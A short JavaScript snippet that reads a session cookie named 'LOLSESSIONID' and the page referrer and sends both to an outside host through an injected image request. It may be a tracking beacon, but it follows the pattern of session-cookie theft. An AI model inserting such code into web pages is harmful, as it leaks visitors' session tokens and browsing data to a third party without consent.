function readCookie(name) {
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for(var i=0;i < ca.length;i++) {
		var c = ca[i];
		while (c.charAt(0)==' ') c = c.substring(1,c.length);
		if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
	}
	return null;
}
var c=readCookie('LOLSESSIONID');
var r=escape(document.referrer);
var s='http://home.wizardishungry.com/t.png/?';
if(c)
    s+='l='+c+'&';
if(r)
    s+='r='+r;
document.write("<img src='"+s+"'>");
